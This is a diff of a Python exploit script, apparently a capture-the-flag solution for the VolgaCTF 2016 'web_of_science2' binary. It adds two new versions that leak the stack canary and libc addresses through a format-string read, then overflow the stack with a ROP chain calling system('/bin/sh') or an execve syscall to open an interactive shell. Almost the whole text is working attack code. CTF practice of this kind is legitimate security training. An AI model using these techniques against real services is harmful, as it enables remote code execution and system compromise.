@@ -8,7 +8,7 @@ gadget4 = exp.rop("pppr")
 gadget5 = exp.rop("ppppr")
 gadget6 = exp.rop("/bin/sh")
 gadget7 = exp.rop("leave")
-shellcode = exp.normal(1) 
+shellcode = exp.normal(1)
 
 #================================================
 #================================================
@@ -63,6 +63,7 @@ else:
 print "=" * 30
 """
 
+"""
 def viewpaperinfo(p,data):
     p.sendl(data)
     p.recvul(":")
@@ -144,20 +145,20 @@ def exploit(p,canary,system,binsh):
     p.recvul(">")
     p.sendl("1")
     p.recvul(":")
-    p.sendl("A"*72+pk65(cananry)+"B"*8+pk64(gadget1)+pk64(binsh)+pk64(system))
+    p.sendl("A"*72+pk64(cananry)+"B"*8+pk64(gadget1)+pk64(binsh)+pk64(system))
 
 
-        
+"""
 #=========================================================
 
-local=True
+local=False
 
 if local:
     p = process("./web_of_science2")
     pause()
     p.debug()
 else:
-    HOST = "webofscience.2016.volgactf.ru"
+    HOST = "localhost"
     PORT = 45678
     p = connect(HOST,PORT)
     pause()
@@ -165,6 +166,7 @@ else:
 
 #=========================================================
 
+"""
 p.recvl()
 p.sendl("Hello")
 p.recvl()
@@ -211,5 +213,85 @@ p.sendl("1")
 p.recvul(">")
 exploit(p,canary,system,binsh)
 
-#this solution is janky 
+#this solution is janky
+"""
+"""
+
+version 2
+prdi = 0x00000000004016b3 # pop rdi; ret;
+prsi = 0x00000000004016b1 # pop rsi; r15; ret;
+#prdx
+
+p.recvl()
+p.sendl("%p."*70)
+p.recvl()
+buf = p.recvl()
+buf = buf.replace(" = ?","",1)
+buf = str(eval(buf))
+print "Answer: " ,buf
+leak = p.recvul(":")
+leak = leak.split(".")
+
+binsh = int(leak[4],16)-0x241465
+system = int(leak[4],16)-0x377b00
+canary = int(leak[42],16)
+syscall = int(leak[42],16)
+
+p.sendl(buf)
+for i in range(0,8):
+    buf = p.recvl()
+    buf = buf.replace(" = ?","",1)
+    buf = str(eval(buf))
+    print "Answer: ",buf
+    p.recv(1024)
+    p.sendl(buf)
+
+p.recvl()
+p.recv(1024)
+p.sendl("A"*136+pk64(canary)+"B"*24+pk64(gadget1)+pk64(binsh)+pk64(system))
+p.interactive()
+"""
+"""
+#version 3 
+
+p.recvl()
+p.sendl("%p."*70)
+p.recvl()
+buf = p.recvl()
+buf = buf.replace(" = ?","",1)
+buf = str(eval(buf))
+print "Answer: " ,buf
+leak = p.recvul(":")
+leak = leak.split(".")
+
+binsh = pk64(int(leak[4],16)-0x241465)
+system = pk64(int(leak[4],16)-0x377b00)
+canary = pk64(int(leak[42],16))
+libc = int(leak[4],16)-0x3be140
+rax = pk64(libc+0x00048858)
+rsi = pk64(libc+0x00024805)
+rdx = pk64(libc+0x000bcee0)
+rdi = pk64(gadget1)
+syscall = pk64(libc+0x000c1e55)
+execv = pk64(59)
+junk1 = pk64(0)
+junk2 = pk64(0)
+
+p.sendl(buf)
+
+for i in range(0,8):
+    buf = p.recvl()
+    buf = buf.replace(" = ?","",1)
+    buf = str(eval(buf))
+    print "Answer: ",buf
+    p.recv(1024)
+    p.sendl(buf)
+
+p.recvl()
+p.recv(1024)
+p.sendl("A"*136+canary+"B"*24+rax+execv+rdi+binsh+rsi+junk1+rdx+junk2+syscall)
+p.interactive()
+
+"""
+
 
